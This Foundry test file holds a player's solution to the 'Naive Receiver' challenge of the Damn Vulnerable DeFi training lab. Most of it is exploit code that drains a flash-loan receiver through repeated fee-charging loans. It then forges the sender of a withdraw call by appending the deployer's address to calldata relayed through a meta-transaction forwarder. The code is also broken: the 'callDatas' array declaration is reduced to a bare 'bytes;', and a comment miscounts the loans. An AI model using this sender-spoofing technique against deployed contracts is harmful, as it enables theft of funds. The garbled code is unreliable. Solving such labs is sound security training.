// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        // NOTE: Create bytes memory called CallDatas that takes 11 arguments
        bytes;
        
        // NOTE: Create batch of callDatas transactions with 9 flahloan and 1 withdraw
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(
                NaiveReceiverPool.flashLoan, 
                (receiver, address(weth), 0, "0x")
            );

            // LOG: show basic info for each flashLoan entry
            console.log("callDatas[%s] length (bytes):", i, callDatas[i].length);

            // print first 32 bytes (contains selector + part of first arg)
            bytes32 firstWord;
            assembly { firstWord := mload(add(callDatas[i], 32)) } // load the first 32-byte word of data
            console.logBytes32(firstWord);

            // print full calldata as bytes (if not too long)
            console.log("callDatas[%s] full bytes:", i);
            console.logBytes(callDatas[i]);
        }

        // NOTE: encodeCall = proper calldata 
        //       encodePacked = only combine bytes 
        // exp: 00f714ce [amount padded 32B] [recovery padded 32B] [deployer padded 32B]
        // actual call data: 4 (from NaiveRecieverPool.withdraw) + 32 + 32 + 32 (from encodePacked (deployer bytes32)) = 100 bytes
        callDatas[10] = abi.encodePacked(
            abi.encodeCall(
                NaiveReceiverPool.withdraw, 
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer))) // smuggle payload
        );

        // LOG: inspect the 11th entry (the one with smuggled payload)
        console.log("=== inspect callDatas[10] (withdraw + smuggled deployer) ===");
        console.log("callDatas[10] length (bytes):", callDatas[10].length);

        // first 32 bytes contains selector (first 4 bytes) + padding; show it
        bytes32 firstWord10;
        assembly { firstWord10 := mload(add(callDatas[10], 32)) }
        console.log("first 32 bytes (callDatas[10]):");
        console.logBytes32(firstWord10);

        // show full callDatas[10]
        console.log("callDatas[10] full bytes:");
        console.logBytes(callDatas[10]);

        // show the last 32-byte word (this should be the smuggled deployer)
        uint len10 = callDatas[10].length;
        bytes32 lastWord10;
        assembly {
            lastWord10 := mload(add(add(callDatas[10], 32), sub(len10, 32)))
        }
        console.log("last 32 bytes (should be deployer as bytes32):");
        console.logBytes32(lastWord10);
        
        // NOTE: builds callData that encodes multicall invocation for the pool contract
        bytes memory callData; 
        callData = abi.encodeCall(pool.multicall, callDatas);

        // LOG: inspect the multicall encoded bytes
        console.log("=== multicall callData ===");
        console.log("callData length (bytes):", callData.length);

        // show first 32 bytes of multicall (selector + head)
        bytes32 multicallFirst;
        assembly { multicallFirst := mload(add(callData, 32)) }
        console.log("multicall first 32 bytes (selector + head):");
        console.logBytes32(multicallFirst);

        console.log("multicall full bytes (truncated if long):");
        console.logBytes(callData);

        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );

        // NOTE: 
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01", // the fixed prefix defined by EIP-191/EIP-712 used 
                //             before hashing domain & struct hash. It prevents certain 
                //             signature replay or ambiguity.
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );

        // LOG: show Request fields and hashes
        console.log("=== Forwarder Request struct fields ===");
        console.log("from (player):");
        console.logAddress(request.from);
        console.log("to (pool):");
        console.logAddress(request.to);
        console.log("value:");
        console.logUint(uint256(request.value));
        console.log("gas:");
        console.logUint(request.gas);
        console.log("nonce:");
        console.logUint(request.nonce);
        console.log("validUntil (seconds):");
        console.logUint(request.validUntil);
        console.log("request.data length:");
        console.logUint(request.data.length);

        bytes32 dataHash = forwarder.getDataHash(request);
        console.log("forwarder.getDataHash(request) (bytes32):");
        console.logBytes32(dataHash);

        bytes32 domainSep = forwarder.domainSeparator();
        console.log("forwarder.domainSeparator() (bytes32):");
        console.logBytes32(domainSep);

        console.log("requestHash (digest to sign):");
        console.logBytes32(requestHash);

        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        console.log("signature r:");
        console.logBytes32(r);
        console.log("signature s:");
        console.logBytes32(s);
        console.log("signature v:");
        console.logUint(v);
        console.log("signature full bytes:");
        console.logBytes(signature);

        forwarder.execute(request, signature);

        console.log("forwarder.execute completed.");
    }
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
